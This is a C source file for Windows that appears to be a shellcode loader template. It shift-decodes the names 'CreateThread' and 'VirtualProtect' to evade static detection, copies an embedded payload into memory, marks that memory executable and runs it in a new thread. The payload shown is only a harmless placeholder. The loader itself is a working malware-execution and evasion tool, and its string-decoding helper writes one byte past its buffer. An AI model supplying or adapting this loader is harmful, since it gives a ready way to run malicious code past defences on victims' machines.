
#include <stdio.h>
#include <string.h>
#include <windows.h>

// Payload to execute
unsigned char payload [] = {
    0x90, 0x90, 0xcc, 0xc3
};

// Function prototypes

typedef HANDLE (WINAPI*pCreateThread)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);

typedef BOOL (WINAPI*pVirtualProtect)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);

unsigned char* rot4(const char* str, size_t size) {
    unsigned char* newStr = (unsigned char*)malloc(size);

    for (int i = 0; i < size; i++) {
        newStr[i] = str[i] - 4;
    }

    newStr[size] = '\0';
    return newStr;
}


// Encrypted function strings.
const char* sCreateThreadEnc = "GviexiXlvieh";
const char* sVirtualProtectEnc = "ZmvxyepTvsxigx";

int main(int argc, char* argv[]) {

    printf("Loading payload...\n");

    unsigned char* sCreateThreadDec = rot4(sCreateThreadEnc, 12);
    unsigned char* sVirtualProtectDec = rot4(sVirtualProtectEnc, 14);
    
    printf("dec CreatThread: %s\n", sCreateThreadDec);
    printf("dec Virutal: %s\n", sVirtualProtectDec);
    

    void* payloadMem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("Payload virtual address: %p\n", payloadMem);

    RtlMoveMemory(payloadMem, payload, sizeof(payload));

    DWORD oldProtect = NULL;
    pVirtualProtect foo = (pVirtualProtect)GetProcAddress(GetModuleHandleA("kernel32.dll"), (LPCSTR)sVirtualProtectDec);
    BOOL good = foo(payloadMem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect);
    if (!good) {
        printf("Failed to load payload!\n");
        return 1;
    }

    printf("Payload loaded, hit to proceed...\n");
    getchar();

    pCreateThread foo2 = (pCreateThread)GetProcAddress(GetModuleHandleA("kernel32.dll"), (LPCSTR)sCreateThreadDec);
    HANDLE thread = foo2(NULL, NULL, (LPTHREAD_START_ROUTINE)payloadMem, NULL, NULL, NULL);
    if (thread == NULL) {
        printf("Failed to execute payload!\n");
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);
    return 0;
}